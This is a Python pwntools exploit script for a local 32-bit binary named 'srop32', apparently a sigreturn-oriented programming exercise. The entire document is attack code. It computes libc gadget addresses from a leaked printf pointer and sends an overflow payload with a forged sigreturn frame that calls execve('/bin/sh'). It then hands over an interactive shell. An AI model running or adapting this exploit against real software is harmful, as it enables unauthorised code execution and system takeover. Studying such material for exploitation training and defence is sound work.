from pwn import *
  
binary = ELF('./srop32')
p = process(binary.path)

p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

#You need to change the value to match the environment you are testing.
libcBase = stackAddr - 0x49020
syscall = libcBase + 0x1d5de6
binsh = libcBase + 0x15902b
ksigreturn = libcBase + 0x1d5de1

print 'The base address of Libc    : ' + hex(libcBase)
print 'Address of syscall gadget   : ' + hex(syscall)
print 'Address of string "/bin/sh" : ' + hex(binsh)
print 'Address of sigreturn()      : ' + hex(ksigreturn)

exploit = ''
exploit += "\x90" * 66
exploit += p32(ksigreturn)
exploit += p32(0x0)
 
exploit += p32(0x0)         #GS
exploit += p32(0x0)         #FS
exploit += p32(0x0)         #ES
exploit += p32(0x0)         #DS
exploit += p32(0x0)         #EDI
exploit += p32(0x0)         #ESI
exploit += p32(0x0)         #EBP
exploit += p32(syscall)     #ESP
exploit += p32(binsh)       #EBX
exploit += p32(0x0)         #EDX
exploit += p32(0x0)         #ECX
exploit += p32(0xb)         #EAX
exploit += p32(0x0)         #trapno
exploit += p32(0x0)         #err
 
exploit += p32(syscall)     #EIP
#Runed a 32bit program in the 64bit operation system.
exploit += p32(0x23)        #CS
exploit += p32(0x0)         #eflags
exploit += p32(0x0)         #esp_atsignal
exploit += p32(0x2b)        #SS
#Runed a 32bit program in the 32bit operation system.
#exploit += p32(0x73)        #CS
#exploit += p32(0x0)         #eflags
#exploit += p32(0x0)         #esp_atsignal
#exploit += p32(0x7b)        #SS
 
p.send(exploit)
p.interactive()
